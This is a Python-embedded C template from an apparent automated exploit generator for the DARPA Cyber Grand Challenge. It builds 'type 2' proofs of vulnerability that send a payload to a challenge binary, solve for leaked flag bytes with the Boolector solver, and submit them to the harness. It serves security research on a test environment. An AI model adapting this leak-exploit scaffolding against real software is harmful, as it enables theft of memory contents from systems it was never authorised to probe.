c_template = """
#include <libcgc.h>
#include <stdlib.h>
#include <boolector.h>
#include <string.h>

/* global output data */
char *output;
size_t output_size;
unsigned int cgc_flag_data_idx;
char received_data[{recv_buf_len}];

enum register_t
{
    eax = 0,
    ecx = 1,
    edx = 2,
    ebx = 3,
    esp = 4,
    ebp = 5,
    esi = 6,
    edi = 7
};

void die(const char *str) {
    transmit(2, str, strlen(str), NULL);
    _terminate(1);
}

void debug_str(const char *str) {
    transmit(2, str, strlen(str), NULL);
}

/*
 * Test file descriptor readiness.
 */

int fd_ready(int fd) {
  struct timeval tv;
  fd_set rfds;
  int readyfds = 0;

  FD_SET(fd, &rfds);

  tv.tv_sec = 1;
  tv.tv_usec = 0;

  int ret;
  ret = fdwait(fd + 1, &rfds, NULL, &tv, &readyfds);

  /* bail if fdwait fails */
  if (ret != 0) {
    return 0;
  }
  if (readyfds == 0)
    return 0;

  return 1;
}

size_t receive_n( int fd, unsigned char *dst, size_t n_bytes )
{
  size_t len = 0;
  size_t rx = 0;
  while(len < n_bytes) {
    if (receive(fd, dst + len, n_bytes - len, &rx) != 0) {
      len = 0;
      break;
    }
    len += rx;
  }

  return len;
}

int fd_ready_timeout(int fd, int timeout_us) {
  struct timeval tv;
  fd_set rfds;
  int readyfds = 0;

  FD_SET(fd, &rfds);

  tv.tv_sec = timeout_us/1000000;
  tv.tv_usec = timeout_us % 1000000;

  int ret;
  ret = fdwait(fd + 1, &rfds, NULL, &tv, &readyfds);

  /* bail if fdwait fails */
  if (ret != 0) {
    return 0;
  }
  if (readyfds == 0)
    return 0;

  return 1;
}

size_t receive_n_timeout( int fd, void *dst_buf, size_t n_bytes, int timeout_us )
{
  char *dst = dst_buf;
  size_t len = 0;
  size_t rx = 0;
  while(len < n_bytes) {
    if (!fd_ready_timeout(fd, timeout_us)) {
      return len;
    }
    if (receive(fd, dst + len, n_bytes - len, &rx) != 0) {
      len = 0;
      break;
    }
    if (rx == 0) {
      return len;
    }
    len += rx;
  }

  return len;
}

/*
 * Receive n_bytes into no particular buffer.
 */
size_t blank_receive( int fd, size_t n_bytes )
{
  size_t len = 0;
  size_t rx = 0;
  char junk_byte;

  while (len < n_bytes) {
    if (!fd_ready(fd)) {
        return len;
    }
    if (receive(fd, &junk_byte, 1, &rx) != 0) {
      len = 0;
      break;
    }
    len += rx;
  }

  return len;
}

int send_all(int fd, const void *msg, size_t n_bytes)
{
  size_t len = 0;
  size_t tx = 0;
  while(len < n_bytes) {
    if (transmit(fd, (char *)msg + len, n_bytes - len, &tx) != 0) {
      return 1;
    }
    len += tx;
  }
  return 0;
}

char to_char(char *str) {
  int i;
  char r = '\\0';

  /* result can '0', '1' or 'x', if 'x' just 0 */
  for(i=0;i<8;i++)
    r |= ((str[7-i] - '0') & 1) << i;

  return r;
}

void to_bits(char *dst, char c) {
    int i;
    for(i=0;i<8;i++) {
        dst[i] = '0' + ((c & (1 << (7-i))) >> (7-i));
    }
}

void append_byte_to_output(int byte_idx) {

    // convert it to a bitstring
    if (output)
        output = realloc(output, output_size + 8 + 1); 
    else
        output = malloc(8 + 1); 

    char *bitbuf = output;
    if (!bitbuf)
      die("bitbuf malloc failed");

    to_bits(bitbuf + output_size, received_data[byte_idx]);

    bitbuf[output_size + 8] = '\\0';

    /* update output size */
    output_size = output_size + 8;
}

typedef struct type1_vals_ {
   unsigned int ipval;
   unsigned int regval;
} type1_vals;

typedef struct type2_vals_ {
   unsigned int region_addr;
   unsigned int region_size;
   unsigned int read_size;
} type2_vals;


/*
 * Negotiate a type 1 pov. Caller specifies an ip bit mask, a register bit mask
 * and a general purpose register number (see the list below).
 *
   0 - eax
   1 - ecx
   2 - edx
   3 - ebx
   4 - esp
   5 - ebp
   6 - esi
   7 - edi
 *
 * Returns 0 on success. On success, the t1vals structure holds required IP
 * and register values that must be found when the target CB crashes. At the
 * time of the crash the following must hold:
 *  (crash_eip & ipmask) == t1vals->ipval
 *  (crash_REG & regmask) == t1vals->regval
 */
int type1_negotiate(unsigned int ipmask, unsigned int regmask, unsigned int regnum, type1_vals *t1vals) {
   uint32_t povType = 1;
   if (send_all(3, &povType, sizeof(povType)) ||
       send_all(3, &ipmask, sizeof(ipmask)) ||
       send_all(3, &regmask, sizeof(regmask)) ||
       send_all(3, &regnum, sizeof(regnum))) {
      return -1;
   }
   if (receive_n(3, (unsigned char *)t1vals, sizeof(type1_vals)) != sizeof(type1_vals)) {
      return -1;
   }
   return 0;
}

/*
 * Negotiate a type 2 pov.
 * Returns 0 on success. On success, the t2vals structure holds the address
 * (t2vals->region_addr) and size of a memory region (t2vals->region_size)
 * from which the POV must leak a specific number of bytes (t2vals->read_size).
 */
int type2_negotiate(type2_vals *t2vals) {
   uint32_t povType = 2;
   if (send_all(3, &povType, sizeof(povType))) {
      return -1;
   }
   if (receive_n(3, (unsigned char *)t2vals, sizeof(type2_vals)) != sizeof(type2_vals)) {
      return -1;
   }
   return 0;
}

/*
 * Submit the len bytes in the val buffer as the results of a type 2 POV
 * Returns 0 on success
 */
int type2_submit(const unsigned char *val, size_t len) {
   return send_all(3, val, len);
}

void constrain_output_var(Btor *btor, int output_var_idx) {
  cgc_flag_data_idx = 5 - output_var_idx;

  {byte_getting_code}

  BoolectorNode *output_val_var = boolector_match_node_by_id(btor, output_var_idx);
  BoolectorNode *output_val = boolector_const(btor, output);
  BoolectorNode *con = boolector_eq(btor, output_val_var, output_val);
  boolector_assert(btor, con);
}

int do_pov() {
  type2_vals t2vals;
  if (type2_negotiate(&t2vals) != 0) {
    die("type 2 negotiate failure\\n");
  }

  char *error;
  int status;

  char payload[] = "{raw_payload}";

  BoolectorNode *cur_byte;

  size_t payload_len = {payload_len};

  // current position in the payload
  size_t payload_off = 0;
  size_t recv_off = 0;

  // BoolectorNodes for use in challenge response
  BoolectorNode *stdout_val_var;
  BoolectorNode *stdout_val;
  BoolectorNode *stdout_con;

  send_all(1, payload+payload_off, payload_len-payload_off);

  recv_off += receive_n_timeout(0, received_data+recv_off, {recv_buf_len}, 500000);
  {solver_code}

  BoolectorNode *cgc_flag_var = boolector_match_node_by_id(btor_0, cgc_flag_data_idx);

  char *flag_data = boolector_bv_assignment(btor_0, cgc_flag_var);

  char flag[4];

  flag[0] = to_char(flag_data + {flag_byte_1} * 8);
  flag[1] = to_char(flag_data + {flag_byte_2} * 8);
  flag[2] = to_char(flag_data + {flag_byte_3} * 8);
  flag[3] = to_char(flag_data + {flag_byte_4} * 8);

  type2_submit((unsigned char *)flag, t2vals.read_size);

  return 0;
}

int main(void) {
    /* align the stack so that boolector can work in all circumstances */
    asm(\"and $0xfffffff0, %esp\\n\");

    /* terminate, stack hasn't been fixed up */
    _terminate(do_pov());
}

"""
